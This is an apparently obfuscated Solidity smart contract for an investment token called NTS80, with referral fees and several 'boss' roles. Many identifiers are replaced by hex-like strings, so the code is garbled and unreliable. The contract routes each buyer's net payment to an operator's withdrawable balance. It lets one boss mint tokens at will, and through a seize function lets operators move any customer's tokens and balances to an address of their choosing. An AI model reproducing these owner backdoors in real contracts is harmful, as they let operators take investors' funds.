pragma solidity 0.5.11;interface ICustomersFundable { function fundCustomer(address customerAddress, uint8 subconto) external payable;}interface IRemoteWallet { function invest(address customerAddress, address target, uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, uint8 subconto) external returns (bool);}interface IFundable { function fund() external payable;}contract NTS80 is IFundable { modifier onlyBagholders { require(myTokens() > 0); _; } modifier onlyAdmin { require(msg.sender == s2c.admin); _; } modifier onlyBoss2 { require(msg.sender == s2c.boss2); _; } modifier onlyBoss3 { require(msg.sender == s2c.boss3); _; } mapping(address => uint256) internal tokenBalanceLedger_; mapping(address => uint256) public referralBalance_; mapping(address => uint256) public repayBalance_; mapping(address => bool) public mayPassRepay; constructor() public { s2c.admin = msg.sender; mayPassRepay[s2c.boss1] = true; mayPassRepay[s2c.boss2] = true; mayPassRepay[s2c.boss3] = true; } function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) { require(msg.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9 >= s2c.minimalInvestment, "Value is below minimal investment."); require(s2c.saleOpen, "Sales stopped for the moment."); return purchaseTokens(msg.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, _ref1, _ref2, _ref3); } function() external payable { require(msg.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9 >= s2c.minimalInvestment, "Value is below minimal investment."); require(s2c.saleOpen, "Sales stopped for the moment."); purchaseTokens(msg.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, address(0x0), address(0x0), address(0x0)); } function reinvest() public { address _customerAddress = msg.sender; uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9 = referralBalance_[_customerAddress]; require(Ox6dc8b93133ee0e923e283bccd6d530795abac3f9 > 0); referralBalance_[_customerAddress] = 0; uint256 _tokens = purchaseTokens(Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, address(0x0), address(0x0), address(0x0)); emit OnReinvestment(_customerAddress, Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, _tokens, false, now); } function remoteReinvest(uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9) public { if (IRemoteWallet(s2c.refBase).invest(msg.sender, address(this), Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, 4)) { uint256 tokens = purchaseTokens(Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, address(0x0), address(0x0), address(0x0)); emit OnReinvestment(msg.sender, Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, tokens, true, now); } } function fund() public payable { emit OnFund(msg.sender, msg.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, now); } function exit() public { address _customerAddress = msg.sender; uint256 Oxb759ffe18e54e4124312da2639a1f0f4a272ef9a = repayBalance_[_customerAddress]; if (Oxb759ffe18e54e4124312da2639a1f0f4a272ef9a > 0) getRepay(); withdraw(); } function withdraw() public { address payable _customerAddress = msg.sender; uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9 = referralBalance_[_customerAddress]; require(Ox6dc8b93133ee0e923e283bccd6d530795abac3f9 > 0); referralBalance_[_customerAddress] = 0; _customerAddress.Oxd2de50e4b1fe88fb90caecf7daf1621aad16c751(Ox6dc8b93133ee0e923e283bccd6d530795abac3f9); emit OnWithdraw(_customerAddress, Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, now); } function getRepay() public { address payable _customerAddress = msg.sender; uint256 Oxb759ffe18e54e4124312da2639a1f0f4a272ef9a = repayBalance_[_customerAddress]; require(Oxb759ffe18e54e4124312da2639a1f0f4a272ef9a > 0); repayBalance_[_customerAddress] = 0; uint256 tokens = tokenBalanceLedger_[_customerAddress]; tokenBalanceLedger_[_customerAddress] = 0; s2c.tokenSupply_ = s2c.tokenSupply_ - tokens; _customerAddress.Oxd2de50e4b1fe88fb90caecf7daf1621aad16c751(Oxb759ffe18e54e4124312da2639a1f0f4a272ef9a); emit OnGotRepay(_customerAddress, Oxb759ffe18e54e4124312da2639a1f0f4a272ef9a, now); } function myTokens() public view returns (uint256) { address _customerAddress = msg.sender; return Oxad007307a911f26f571c07e8d20443b977230254(_customerAddress); } function Oxad007307a911f26f571c07e8d20443b977230254(address _customerAddress) public view returns (uint256) { return tokenBalanceLedger_[_customerAddress]; } function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) { address _customerAddress = msg.sender; uint8 welcomeFee_ = s2c.refLevel1_ + s2c.refLevel2_ + s2c.refLevel3_; require(welcomeFee_ <= 99); uint256[7] memory uIntValues = [ _incomingEthereum * welcomeFee_ / 100, 0, 0, 0, 0, 0, 0 ]; uIntValues[1] = uIntValues[0] * s2c.refLevel1_ / welcomeFee_; uIntValues[2] = uIntValues[0] * s2c.refLevel2_ / welcomeFee_; uIntValues[3] = uIntValues[0] * s2c.refLevel3_ / welcomeFee_; uint256 _taxedEthereum = _incomingEthereum - uIntValues[0]; uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum); require(_amountOfTokens > 0); if ( _ref1 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[_ref1] * s2c.tokenPrice >= s2c.stakingRequirement ) { if (s2c.refBase == address(0x0)) { referralBalance_[_ref1] += uIntValues[1]; } else { ICustomersFundable(s2c.refBase).fundCustomer.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9(uIntValues[1])(_ref1, 1); uIntValues[4] = uIntValues[1]; } } else { referralBalance_[s2c.boss1] += uIntValues[1]; _ref1 = 0x0000000000000000000000000000000000000000; } if ( _ref2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[_ref2] * s2c.tokenPrice >= s2c.stakingRequirement ) { if (s2c.refBase == address(0x0)) { referralBalance_[_ref2] += uIntValues[2]; } else { ICustomersFundable(s2c.refBase).fundCustomer.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9(uIntValues[2])(_ref2, 2); uIntValues[5] = uIntValues[2]; } } else { referralBalance_[s2c.boss1] += uIntValues[2]; _ref2 = 0x0000000000000000000000000000000000000000; } if ( _ref3 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[_ref3] * s2c.tokenPrice >= s2c.stakingRequirement ) { if (s2c.refBase == address(0x0)) { referralBalance_[_ref3] += uIntValues[3]; } else { ICustomersFundable(s2c.refBase).fundCustomer.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9(uIntValues[3])(_ref3, 3); uIntValues[6] = uIntValues[3]; } } else { referralBalance_[s2c.boss1] += uIntValues[3]; _ref3 = 0x0000000000000000000000000000000000000000; } referralBalance_[s2c.boss2] += _taxedEthereum; s2c.tokenSupply_ += _amountOfTokens; tokenBalanceLedger_[_customerAddress] += _amountOfTokens; emit OnTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, uIntValues[4], uIntValues[5], uIntValues[6], now); return _amountOfTokens; } function ethereumToTokens_(uint256 _ethereum) public pure returns (uint256) { uint256 _tokensReceived = _ethereum * 1e18 / s2c.tokenPrice; return _tokensReceived; } function tokensToEthereum_(uint256 _tokens) public pure returns (uint256) { uint256 _etherReceived = _tokens / s2c.tokenPrice * 1e18; return _etherReceived; } function mint(address customerAddress, uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9) public onlyBoss3 { s2c.tokenSupply_ += Ox6dc8b93133ee0e923e283bccd6d530795abac3f9; tokenBalanceLedger_[customerAddress] += Ox6dc8b93133ee0e923e283bccd6d530795abac3f9; emit OnMint(customerAddress, Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, now); } function setRefBonus(uint8 level1, uint8 level2, uint8 level3, uint256 minInvest, uint256 staking) public { require(msg.sender == s2c.boss3 || msg.sender == s2c.admin); s2c.refLevel1_ = level1; s2c.refLevel2_ = level2; s2c.refLevel3_ = level3; s2c.minimalInvestment = minInvest; s2c.stakingRequirement = staking; emit OnRefBonusSet(level1, level2, level3, minInvest, staking, now); } function passRepay(address customerAddress) public payable { require(mayPassRepay[msg.sender], "Not Oxd124aa447654a8ac60caf6e8f8a8877ff865616b Ox06f4dccdb3cbb77d4019bdacaaa6e01cfd6ef057 pass repay Ox7fa6870627a0a170d31deb971d693b3859f8b498 your address."); uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9 = msg.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9; require(Ox6dc8b93133ee0e923e283bccd6d530795abac3f9 > 0); repayBalance_[customerAddress] += Ox6dc8b93133ee0e923e283bccd6d530795abac3f9; emit OnRepayPassed(customerAddress, msg.sender, Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, now); } function allowPassRepay(address payer) public onlyAdmin { mayPassRepay[payer] = true; emit OnRepayAddressAdded(payer, now); } function denyPassRepay(address payer) public onlyAdmin { mayPassRepay[payer] = false; emit OnRepayAddressRemoved(payer, now); } function passInterest(address customerAddress, uint256 ethRate, uint256 rate) public payable { require(mayPassRepay[msg.sender], "Not Oxd124aa447654a8ac60caf6e8f8a8877ff865616b Ox06f4dccdb3cbb77d4019bdacaaa6e01cfd6ef057 pass interest Ox7fa6870627a0a170d31deb971d693b3859f8b498 your address."); require(msg.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9 > 0); if (s2c.refBase == address(0x0)) { referralBalance_[customerAddress] += msg.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9; } else { ICustomersFundable(s2c.refBase).fundCustomer.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9(msg.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9)(msg.sender, 5); } emit OnInterestPassed(customerAddress, msg.Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, ethRate, rate, now); } function saleStop() public onlyAdmin { s2c.saleOpen = false; emit OnSaleStop(now); } function saleStart() public onlyAdmin { s2c.saleOpen = true; emit OnSaleStart(now); } function deposeBoss3(address x) public onlyAdmin { emit OnBoss3Deposed(s2c.boss3, x, now); s2c.boss3 = x; } function setRefBase(address x) public onlyAdmin { emit OnRefBaseSet(s2c.refBase, x, now); s2c.refBase = x; } function seize(address customerAddress, address receiver) public { require(msg.sender == s2c.boss1 || msg.sender == s2c.boss2); uint256 tokens = tokenBalanceLedger_[customerAddress]; if (tokens > 0) { tokenBalanceLedger_[customerAddress] = 0; tokenBalanceLedger_[receiver] += tokens; } uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9 = referralBalance_[customerAddress]; if (Ox6dc8b93133ee0e923e283bccd6d530795abac3f9 > 0) { referralBalance_[customerAddress] = 0; referralBalance_[receiver] += Ox6dc8b93133ee0e923e283bccd6d530795abac3f9; } uint256 repay = repayBalance_[customerAddress]; if (repay > 0) { repayBalance_[customerAddress] = 0; referralBalance_[receiver] += repay; } emit OnSeize(customerAddress, receiver, tokens, Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, repay, now); } event OnTokenPurchase( address indexed customerAddress, uint256 incomingEthereum, uint256 tokensMinted, address ref1, address ref2, address ref3, uint256 ref1value, uint256 ref2value, uint256 ref3value, uint256 timestamp ); event OnReinvestment( address indexed customerAddress, uint256 ethereumReinvested, uint256 tokensMinted, bool isRemote, uint256 timestamp ); event OnWithdraw( address indexed customerAddress, uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, uint256 timestamp ); event OnGotRepay( address indexed customerAddress, uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, uint256 timestamp ); event OnRepayPassed( address indexed customerAddress, address indexed payer, uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, uint256 timestamp ); event OnInterestPassed( address indexed customerAddress, uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, uint256 ethRate, uint256 rate, uint256 timestamp ); event OnSaleStop( uint256 timestamp ); event OnSaleStart( uint256 timestamp ); event OnRepayAddressAdded( address indexed payer, uint256 timestamp ); event OnRepayAddressRemoved( address indexed payer, uint256 timestamp ); event OnMint( address indexed customerAddress, uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, uint256 timestamp ); event OnBoss3Deposed( address indexed former, address indexed current, uint256 timestamp ); event OnRefBonusSet( uint8 level1, uint8 level2, uint8 level3, uint256 minimalInvestment, uint256 stakingRequirement, uint256 timestamp ); event OnRefBaseSet( address indexed former, address indexed current, uint256 timestamp ); event OnSeize( address indexed customerAddress, address indexed receiver, uint256 tokens, uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, uint256 repayValue, uint256 timestamp ); event OnFund( address indexed source, uint256 Ox6dc8b93133ee0e923e283bccd6d530795abac3f9, uint256 timestamp );struct scalar2Vector {address refBase;bool saleOpen;uint256 tokenSupply_;uint256 stakingRequirement;uint256 minimalInvestment;uint256 tokenPrice;uint8 refLevel3_;uint8 refLevel2_;uint8 refLevel1_;address boss3;address boss2;address boss1;address admin;uint8 Ox1f536ef44db56365046011b48b805cebcae04f49;string Ox37bb67a7f85c7727bb9b70d4965f924d527ecc8c;string Ox6f3d81ac7f1d104f487ea5230e3b7d4c089ee4da;}scalar2Vector s2c = scalar2Vector( address(0x0), true, 0, 0, 2.5 ether, 0.001 ether, 2, 3, 9, 0xf4632894bF968467091Dec1373CC1Bf5d15ef6B1, 0xf43414ABb5a05c3037910506571e4333E16a4bf4, 0xCa27fF938C760391E76b7aDa887288caF9BF6Ada, address(0), 18, "NTS80", "NTS 80");}